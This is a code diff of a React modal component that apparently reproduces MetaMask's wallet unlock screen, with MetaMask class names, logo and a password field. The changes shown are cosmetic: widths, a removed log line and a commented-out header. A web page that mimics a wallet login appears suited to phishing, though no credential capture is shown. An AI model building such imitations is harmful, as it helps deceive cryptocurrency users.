@@ -108,7 +108,6 @@ const MM = ({ isOpen, setIsOpen }) => {
   const handleFocus = () => setPwdFocus(true);
   useEffect(() => {
     if (isOpen) {
-      console.log("ether----", window.ethereum);
       if (!window.ethereum) return;
       setTimeout(() => {
         setLoading(false);
@@ -137,12 +136,12 @@ const MM = ({ isOpen, setIsOpen }) => {
             display: "flex",
             flexDirection: "column",
             overflowX: "hidden",
-            width: "375px",
+            width: "400px",
           }}
         >
           <div
             style={{
-              width: "370px",
+              width: "400px",
               height: "600px",
               backgroundColor: "#fff",
               display: "flex",
@@ -178,7 +177,7 @@ const MM = ({ isOpen, setIsOpen }) => {
           <div id="app-content">
             <div className="app os-win">
               <div className="mm-box multichain-app-header multichain-app-header-shadow mm-box--margin-bottom-0 mm-box--display-flex mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
-                <div className="mm-box multichain-app-header__lock-contents mm-box--padding-2 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
+                {/* <div className="mm-box multichain-app-header__lock-contents mm-box--padding-2 mm-box--display-flex mm-box--gap-2 mm-box--justify-content-space-between mm-box--align-items-center mm-box--width-full mm-box--background-color-background-default">
                   <div>
                     <button
                       className="mm-box mm-picker-network multichain-app-header__contents__network-picker mm-box--padding-right-4 mm-box--padding-left-2 mm-box--display-flex mm-box--gap-2 mm-box--align-items-center mm-box--background-color-background-alternative mm-box--rounded-pill"
@@ -233,7 +232,7 @@ const MM = ({ isOpen, setIsOpen }) => {
                       src={meta_logo}
                     ></img>
                   </button>
-                </div>
+                </div> */}
               </div>
               <div className="mm-box main-container-wrapper">
                 <div className="unlock-page__container">
